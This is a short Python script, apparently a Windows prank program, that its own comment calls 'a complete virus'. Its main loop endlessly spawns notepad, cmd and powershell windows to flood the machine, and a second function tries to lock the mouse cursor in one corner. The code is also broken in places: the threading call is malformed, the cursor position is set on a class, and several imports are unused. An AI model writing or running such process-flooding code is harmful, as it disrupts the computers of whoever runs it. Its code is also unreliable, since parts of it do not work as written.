import os,rotatescreen
from pynput.mouse import Controller
from sys import argv
import threading
angle=(90,180,270,360)
rotatescreen.get_primary_display()
import usb.core
from PIL import Image
#                   a complete virus!!!!!!💀💀💀💀
def run_virus():
    while True:
        os.system("start notepad")
        os.system("start cmd")
        os.system("start powershell")
def mouse_position():
    while True:
        Controller.position=(0,0)

while True:
    threading.Thread(target=run_virus(),daemon=True) 